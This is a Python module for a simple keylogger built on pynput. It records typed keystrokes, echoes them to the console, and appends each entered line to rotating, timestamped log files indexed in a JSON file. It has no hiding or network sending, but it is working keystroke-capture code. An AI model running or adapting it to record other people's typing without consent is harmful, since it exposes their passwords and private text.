import modules.config as cfg
import os
import json
import datetime
from pynput import keyboard

class main:
    def __init__(self):
        self.log_folder = cfg.log_folder
        
        self.max_file_size = cfg.max_file_size
        self.log_file_format = cfg.log_file_format
        self.log_file_date_format = cfg.log_file_date_format
        
        self.log_format = cfg.log_format
        self.log_date_format = cfg.log_date_format
        self.log_level = cfg.log_level

        self.word = ""
        self.log_files = self.load_log_files()     

    @staticmethod
    def get_date(date_format):
        return datetime.datetime.now().strftime(date_format)

    @staticmethod
    def filter_word(word, filter, char="*"):
        return word.replace(filter, char)

    @staticmethod
    def get_file_size(file_path):
        return os.path.getsize(file_path)

    def create_new_file(self):
        self.log_file = self.log_folder + '/' + self.log_file_format
        self.log_file = self.log_file.replace("%(file_date_format)", self.get_date(self.log_file_date_format))
        with open(self.log_file, "wb") as f:
            pass
        self.log_files.append(self.log_file)
        self.save_log_files()
        return self.log_file
    
    def read_log_file(self, file_path):
        if file_path not in self.log_files:
            print("File not found!")
            return
        with open(file_path, "rb") as f:
            for line in f:
                print(line.strip().decode('utf-8'))

    def select_log_file(self, file_path = None):
        if file_path not in self.log_files:
            print("Select log file:")
            for i in range(len(self.log_files)):
                print(str(i) + ": " + self.log_files[i])
            print("Enter number: ")
            try:
                self.log_file = self.log_files[int(input())]
            except ValueError:
                print("Invalid number!")
                return self.select_log_file()
        elif file_path in self.log_files:
            self.log_file = file_path
            return self.log_file
    
    def save_log_files(self):
        with open("log_files.json", "w") as f:
            json.dump(self.log_files, f)

    def load_log_files(self):
        try:
            with open("log_files.json", "r") as f:
                self.log_files = json.load(f)
        except FileNotFoundError:
            self.log_files = []
        return self.log_files
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.space:
                self.word += " "
            else:
                self.word += str(key.char)
            print(key.char, end="")
        except AttributeError:
            print("Special key {0} pressed".format(key))

    def on_release(self, key):
        if key == keyboard.Key.enter:
            with open(self.log_file, "ab") as f:
                formatted_word = self.log_format.replace("%(date_format)", self.get_date(self.log_date_format)).replace("%(level)", self.log_level).replace("%(word)", self.word)
                f.write(formatted_word.encode('utf-8') + b"\n")
            print("")
            self.word = ""
            if self.get_file_size(self.log_file) > self.max_file_size:
                self.create_new_file()
        elif key == keyboard.Key.esc:
            return False

    def listen(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()